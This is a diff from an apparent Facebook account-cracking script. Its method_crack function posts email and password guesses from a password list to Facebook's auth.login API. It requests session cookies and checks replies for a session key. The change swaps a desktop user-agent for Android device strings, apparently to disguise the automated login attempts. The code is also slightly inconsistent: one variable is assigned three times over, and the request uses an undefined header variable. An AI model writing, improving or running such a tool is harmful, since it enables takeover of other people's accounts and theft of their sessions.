@@ -104,7 +104,9 @@ def method_crack(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header_grup =  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
+            ua =  'Dalvik/2.1.0 (Linux; U; Android 9; AFTSS Build/PS7646.3550N) CTV'
+            ua =  'Dalvik/2.1.0 (Linux; U; Android 13; SM-N986U Build/TP1A.220624.014)'
+            ua =  'Dalvik/2.1.0 (Linux; U; Android 13; SM-A146U Build/TP1A.220624.014)'
             url='https://api.facebook.com/method/auth.login'
             reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
